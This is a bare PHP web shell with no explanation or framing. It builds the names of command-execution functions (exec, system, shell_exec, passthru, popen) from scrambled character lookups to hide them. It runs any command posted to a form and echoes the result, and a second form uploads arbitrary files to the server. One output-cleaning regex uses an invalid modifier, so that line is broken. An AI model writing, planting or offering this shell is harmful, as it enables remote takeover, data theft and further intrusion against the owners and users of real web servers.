<?php
function myhed($in) {
	$a = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`!@#$%^&*()-_+={}[]|\/:;"<>,.?';
	$b = $a[4].$a[23].$a[4].$a[2];
	$c = $a[15].$a[0].$a[18].$a[18].$a[19].$a[7].$a[17].$a[20];
	$d = $c[3].$a[24].$c[2].$a[19].$b[2].$a[12];
	$e = $d[2].$a[7].$d[4].$a[11].$a[11].$a[75].$b;
	$f = $a[15].$a[14].$a[15].$e[8].$a[13];
	$g = $a[5].$c[6].$e[6].$c[1].$a[3];
	$h = $f[2].$a[2].$e[4].$a[14].$c[2].$e[2];
	$out = '';
	if (function_exists($b)) {
		@$b($in,$out);
		$out = @join("\n",$out);
	}elseif (function_exists($c)) {
		ob_start();
		@$c($in);
		$out = ob_get_clean();
	} elseif (function_exists($d)) {
		ob_start();
		@$d($in);
		$out = ob_get_clean();
	} elseif (function_exists($e)) {
		$out = $e($in);
	} elseif (is_resource($i = @$f($in,"r"))) {
		$out = "";
		while(!@feof($i))
		$out .= $g($i,4096);
		$h($i);
	}
	return $out;
}

echo '<div><form method="POST" enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'">
<input type="text" name="c"><input type="submit" name="x" value="send">
</form></div>';
echo '<div><form method="POST" enctype="multipart/form-data" action="'.$_SERVER['PHP_SELF'].'">
<input type="file" name="myFile"><input type="submit" name="var" value="crot">
</form></div>';
if (isset($_POST['var']) && isset($_FILES['myFile'])) {
   $file = $_FILES['myFile']['tmp_name'];
   $name = $_FILES['myFile']['name'];
   if (!move_uploaded_file($file, $name)) {
       echo 'failed';
   } else {
       echo 'success';
   }
   exit;
}
if (!empty($_POST['c'])) {
	$lines = preg_replace('/^\s+/gm', '', myhed($_POST['c']));
    echo "<pre>";
    echo $lines;
    echo "</pre>";
    exit;
}
?>
